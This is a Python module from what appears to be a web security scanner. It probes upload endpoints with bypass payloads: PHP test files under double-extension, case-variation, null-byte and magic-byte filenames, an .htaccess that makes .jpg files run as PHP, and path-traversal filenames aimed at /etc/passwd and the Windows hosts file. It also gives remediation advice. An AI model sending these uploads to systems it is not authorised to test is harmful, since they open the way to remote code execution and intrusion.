"""
File upload validation bypass scanner.
Tests:
- Extension blacklist bypass (double extension, null byte, case variation)
- MIME type spoofing
- Magic bytes validation bypass
- Path traversal in filename
"""
from __future__ import annotations

import base64
from typing import Any

from core.base_module import BaseModule
from core.result import Severity


class FileUploadBypass(BaseModule):
    name = "upload"
    description = "File upload validation bypass detection"
    supported_vectors = ["path_traversal"]

    PAYLOAD_FILES = [
        # Extension bypass
        ("shell.php", b"<?php echo 'X'; ?>", "PHP shell"),
        ("shell.php.jpg", b"<?php echo 'X'; ?>", "Double extension"),
        ("shell.pHp", b"<?php echo 'X'; ?>", "Case variation"),
        ("shell.php%00.jpg", b"<?php echo 'X'; ?>", "Null byte truncation"),
        ("shell.php.123", b"<?php echo 'X'; ?>", "Unknown double ext"),
        (".htaccess", b"AddType application/x-httpd-php .jpg\n", "Apache .htaccess"),
        # MIME bypass
        ("shell.jpg", b"GIF89a\n<?php echo 'X'; ?>", "Magic bytes + PHP"),
        # Path traversal
        ("../../etc/passwd", b"test", "Path traversal filename"),
        ("..\\..\\windows\\system32\\drivers\\etc\\hosts", b"test", "Windows path traversal"),
    ]

    async def run(self, target: str, **kwargs: Any) -> list[Finding]:
        self._current_target = target
        endpoints = kwargs.get("endpoints", ["/upload", "/api/upload", "/files", "/attachments"])
        for endpoint in endpoints:
            url = target.rstrip("/") + endpoint
            for filename, content, desc in self.PAYLOAD_FILES:
                await self._probe(url, filename, content, desc)
        return self.findings

    async def _probe(self, url: str, filename: str, content: bytes, desc: str) -> None:
        try:
            resp = await self.client.post(
                url,
                files={"file": (filename, content, "application/octet-stream")},
            )
            text = resp.text.lower()
            # If the server accepted it without error and gives a path back
            if resp.status_code in (200, 201, 302):
                if any(x in text for x in ["uploaded", "success", filename.lower(), "/uploads/", "/files/"]):
                    self.add_finding(
                        vector="path_traversal",
                        severity="high",
                        title=f"File upload may accept dangerous file: {desc}",
                        description=f"Uploaded '{filename}' ({desc}) and server accepted it without rejection.",
                        confidence=60,
                        evidence=[
                            self.client.build_evidence(
                                resp.request, resp,
                                description=f"Upload accepted: {filename}",
                            )
                        ],
                        remediation=(
                            "Validate file extensions against an allow-list (e.g., jpg, png, pdf). "
                            "Verify MIME type and magic bytes match. Store uploads outside webroot. "
                            "Rename files with random names. Scan with AV. Disable script execution in upload directories."
                        ),
                    )
        except Exception:
            pass
